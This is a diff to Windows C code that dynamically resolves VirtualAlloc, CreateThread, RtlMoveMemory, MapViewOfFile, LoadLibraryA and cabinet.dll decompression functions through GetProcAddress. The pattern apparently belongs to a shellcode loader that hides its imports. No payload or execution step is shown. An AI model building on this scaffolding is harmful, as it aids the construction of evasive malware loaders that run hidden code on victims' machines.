@@ -1,6 +1,7 @@
 // --- 1. Define Typedefs for all required function pointers ---
 typedef HMODULE (WINAPI *pGetModuleHandleA)(LPCSTR);
 typedef FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
+typedef HMODULE (WINAPI *pLoadLibraryA)(LPCSTR);
 typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
 typedef HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
 typedef VOID (WINAPI *pRtlMoveMemory)(VOID UNALIGNED *, const VOID UNALIGNED *, SIZE_T);
@@ -11,7 +12,9 @@ typedef LPVOID (WINAPI *pMapViewOfFile)(HANDLE, DWORD, DWORD, DWORD, SIZE_T);
 typedef HANDLE (WINAPI *pGetProcessHeap)(VOID);
 typedef LPVOID (WINAPI *pHeapAlloc)(HANDLE, DWORD, SIZE_T);
 typedef BOOL (WINAPI *pHeapFree)(HANDLE, DWORD, LPVOID);
-
+typedef BOOL (WINAPI *pCreateDecompressor)(DWORD, PVOID, PDECOMPRESSOR_HANDLE);
+typedef BOOL (WINAPI *pDecompress)(DECOMPRESSOR_HANDLE, LPCVOID, SIZE_T, PVOID, SIZE_T, PSIZE_T);
+typedef BOOL (WINAPI *pCloseDecompressor)(DECOMPRESSOR_HANDLE);
 
 // --- 2. Declare global variables to hold the resolved function pointers ---
 pVirtualAlloc pfnVirtualAlloc;
@@ -24,7 +27,10 @@ pMapViewOfFile pfnMapViewOfFile;
 pGetProcessHeap pfnGetProcessHeap;
 pHeapAlloc pfnHeapAlloc;
 pHeapFree pfnHeapFree;
-
+pCreateDecompressor pfnCreateDecompressor;
+pDecompress pfnDecompress;
+pCloseDecompressor pfnCloseDecompressor;
+pLoadLibraryA pfnLoadLibraryA;
 
 void ResolveAPIs() {
     pGetModuleHandleA pfnGetModuleHandleA = (pGetModuleHandleA)((ULONG_PTR)GetModuleHandleA);
@@ -33,6 +39,7 @@ void ResolveAPIs() {
     HMODULE hKernel32 = pfnGetModuleHandleA("kernel32.dll");
     if (hKernel32 == NULL) { return; }
 
+    pfnLoadLibraryA = (pLoadLibraryA)pfnGetProcAddress(hKernel32, "LoadLibraryA");
     pfnVirtualAlloc = (pVirtualAlloc)pfnGetProcAddress(hKernel32, "VirtualAlloc");
     pfnCreateThread = (pCreateThread)pfnGetProcAddress(hKernel32, "CreateThread");
     pfnWaitForSingleObject = (pWaitForSingleObject)pfnGetProcAddress(hKernel32, "WaitForSingleObject");
@@ -46,6 +53,16 @@ void ResolveAPIs() {
     HMODULE hNtdll = pfnGetModuleHandleA("ntdll.dll");
     if (hNtdll == NULL) { return; }
     pfnRtlMoveMemory = (pRtlMoveMemory)pfnGetProcAddress(hNtdll, "RtlMoveMemory");
+
+    HMODULE hCabinet = pfnGetModuleHandleA("cabinet.dll");
+    if (hCabinet == NULL && pfnLoadLibraryA != NULL) { 
+        hCabinet = pfnLoadLibraryA("cabinet.dll"); 
+    }
+    if (hCabinet != NULL) {
+        pfnCreateDecompressor = (pCreateDecompressor)pfnGetProcAddress(hCabinet, "CreateDecompressor");
+        pfnDecompress = (pDecompress)pfnGetProcAddress(hCabinet, "Decompress");
+        pfnCloseDecompressor = (pCloseDecompressor)pfnGetProcAddress(hCabinet, "CloseDecompressor");
+    }
 
     DEBUG_PRINT("ResolveApis: API functions resolved.");
 }
